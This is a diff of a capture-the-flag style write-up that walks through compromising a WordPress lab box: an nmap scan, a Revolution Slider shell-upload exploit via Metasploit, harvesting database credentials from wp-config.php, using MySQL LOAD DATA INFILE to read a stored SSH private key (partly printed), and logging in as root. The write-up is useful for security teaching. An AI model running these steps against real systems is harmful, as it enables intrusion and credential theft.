@@ -16,6 +16,7 @@ OpenVPN Config (Download)
 ### Procedure
 #### Pre WP instance hack
 1. Scan the subnet for anything with port 80 and 443 open because the Wordpress web instance should be running on one of those. 
+
 	```NMAP
 	Command:
 	nmap -p 80,443 172.30.0.0/28
@@ -51,6 +52,7 @@ OpenVPN Config (Download)
 
 2. We can see from the output above that 172.30.0.3 has port 80 open and by using the web browser of your choice, we can confirm this. 
 3. In the problem description it mentions that Revolution Slider doesn’t show up in wpscan, but we need to validate this before continuing. What we see is that it’s actually vulnerable because of Revolution Slider
+
 	```NMAP
 	[+] revslider
 	 | Location: http://172.30.0.3/wp-content/plugins/revslider/
@@ -79,12 +81,14 @@ OpenVPN Config (Download)
 
 	```
 	 The only thing we really care about in the output above is 
+
 	```NMA
 	[!] Title: WordPress Slider Revolution Shell Upload
 	 |     Fixed in: 3.0.96
 	```
 	With this in mind we can follow one of the references and see what we can do with this information. Once done we see it has an msf exploit that will handle all the hacking we need to do
 4. Lets employ that msf exploit to get shell on the box
+
 	```NMA
 	1. msfconsole
 	2. use exploit/unix/webapp/wp_revslider_upload_execute
@@ -96,10 +100,12 @@ OpenVPN Config (Download)
 
 #### Post WP instance hack aka Database hack
 1. You start in the directory of the exploit but we can go ahead and get to the root directory we care about
+
 	```NMA
 	cd /var/www
 	```
 2. Once in there we can see something called note.txt which reads:
+
 	```NMA
 	Your ssh key was placed in /backup/id_rsa on the DB server.
 	```
@@ -108,11 +114,13 @@ OpenVPN Config (Download)
 I'll be honest here, I completely overlooked this for the first few hours. What I did, and what you should do on most penetration test boxes is run LinEnum.sh and LinuxPrivChecker.py to see if anything works right out of the gate to get root. Neither of these worked so I moved on
 
 To get the database credentials we need some previous knowledge about Wordpress. Let’s first assume that it too uses a database (which of course it does) and then let’s assume that it has to store the login in plaintext so that I too can use them. These two things coupled means we need to cat wp-config.php
+
 ```NMA
 cat wp-config.php
 ```
 
 and that dumps a huge mess which is below
+
 ```NMA
 <?php
 /**
@@ -207,6 +215,7 @@ require_once( ABSPATH . 'wp-settings.php' );
 ```
 
  Thankfully we only care about ONE section of this
+
 ```NMA
 
 	// ** MySQL settings - You can get this info from your web host ** //
@@ -227,6 +236,7 @@ require_once( ABSPATH . 'wp-settings.php' );
 Check it out! There is the database login!
 
 4. Lets log into the server
+
 	```NMA
 	mysql -u wordpress -p -h 172.30.0.2
 
@@ -236,14 +246,17 @@ Check it out! There is the database login!
 	-h is the host which is 172.30.0.2
 	```
 5. Once logged in using the credentials we should poke around a bit. We know that the wp instance uses the Wordpress database which we can select as our database too. 
+
 	```
 	use wordpress; #; is very important here
 	```
 	 And now lets see the tables we are working with
+
 	```
 	show tables;
 	```
 	Once we look around for a few minutes we can see that `wp_links` is empty
+
 	```
 	select * from wp_links;
 
@@ -253,6 +266,7 @@ Check it out! There is the database login!
 
 	This seems like a good place to dump the contents of a file (hint hint)
 6. We were given that the ssh key was in `/backup/id_rsa` which we can actually dump the contents of that file into `wp_links`
+
 	```sql
 	LOAD DATA INFILE '/backup/id_rsa' REPLACE INTO TABLE wordpress.wp_links (link_notes);
 
@@ -262,11 +276,13 @@ Check it out! There is the database login!
 	```
 
 	To view the now dumped contents: 
+
 	```sql
 	select * from wp_links
 	```
 
 7. After a ton of click select delete we are left with an SSH key
+
 	```
 	-----BEGIN RSA PRIVATE KEY-----                                 
 	MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc
@@ -299,17 +315,20 @@ Check it out! There is the database login!
 	I selected to save that onto my desktop as name `id_rsa`
 
 	Once saved run:
+
 	```
 	chmod 600 id_rsa
 	```
 
 #### Root box login
 1. We can now ssh into the root machine with the flag
+
 	```
 	ssh -i ~/Desktop/id_rsa root@172.30.0.3
 	```
 
 2. Hey check that out! We are in.
+
 	```
 	cat /root/flag.txt
 
